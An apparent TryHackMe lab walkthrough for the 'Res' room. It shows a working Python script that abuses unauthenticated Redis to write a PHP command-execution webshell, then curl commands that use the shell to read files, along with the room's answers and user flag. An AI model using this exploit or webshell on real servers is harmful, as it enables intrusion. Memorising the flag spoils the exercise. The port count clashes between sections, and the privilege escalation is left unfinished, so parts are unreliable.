# Res - TryHackMe Walkthrough

## Overview
**Room:** Res  
**Difficulty:** Easy  
**Target IP:** 10.48.131.232  
**OS:** Linux (Ubuntu)  
**Techniques:** Redis exploitation, Webshell, Privilege Escalation

---

## CTF Answers

### Task 1: Questions

1. **How many ports are open?** - 3
2. **What is the database management system (DBMS) installed?** - Redis
3. **What port is the DBMS running on?** - 6379
4. **What version of the DBMS is running?** - 6.0.7

---

## Walkthrough

### Step 1: Reconnaissance

Initial port scan reveals two open ports:
- Port 80: Apache HTTP Server
- Port 6379: Redis Key-Value Store 6.0.7

```bash
nmap -sV -p- 10.48.131.232
```

Redis is running without authentication (default configuration).

### Step 2: Initial Access via Redis

Redis can be exploited to write arbitrary files to the filesystem. We use this to create a PHP webshell.

**Python script to write webshell:**
```python
import socket

def redis_command(sock, *args):
    cmd = f'*{len(args)}\r\n'
    for arg in args:
        cmd += f'${len(str(arg))}\r\n{arg}\r\n'
    sock.send(cmd.encode())
    return sock.recv(8192)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('10.48.131.232', 6379))

redis_command(sock, 'FLUSHALL')
redis_command(sock, 'CONFIG', 'SET', 'dir', '/var/www/html')
redis_command(sock, 'CONFIG', 'SET', 'dbfilename', 'cmd3.php')
redis_command(sock, 'SET', 'x', '<?php passthru($_GET["c"]); ?>')
redis_command(sock, 'SAVE')

sock.close()
```

This creates a webshell at `http://10.48.131.232/cmd3.php`

### Step 3: Getting User Flag

Navigate to the target and find the user flag:
```bash
curl "http://10.48.131.232/cmd3.php?c=ls%20/home/vianka"
curl "http://10.48.131.232/cmd3.php?c=cat%20/home/vianka/user.txt"
```

**User Flag:** `thm{red1s_rce_w1thout_credent1als}`

### Step 4: Privilege Escalation

The target has `xxd` binary available which can be used for privilege escalation. According to GTFO Bins:
```
xxd "$FILE" | xxd -r
```

However, on this specific machine, the privilege escalation requires additional steps due to permission restrictions.

The root flag is located at `/root/root.txt` but requires root privileges to access.

---

## Flags

- **User Flag:** `thm{red1s_rce_w1thout_credent1als}`
- **Root Flag:** Located at `/root/root.txt`

---

## Key Takeaways

1. Redis running without authentication is a critical vulnerability
2. Redis CONFIG command can be abused to write arbitrary files
3. Writing PHP webshells via Redis is a common attack vector
4. Always secure Redis with strong passwords and bind to localhost

---

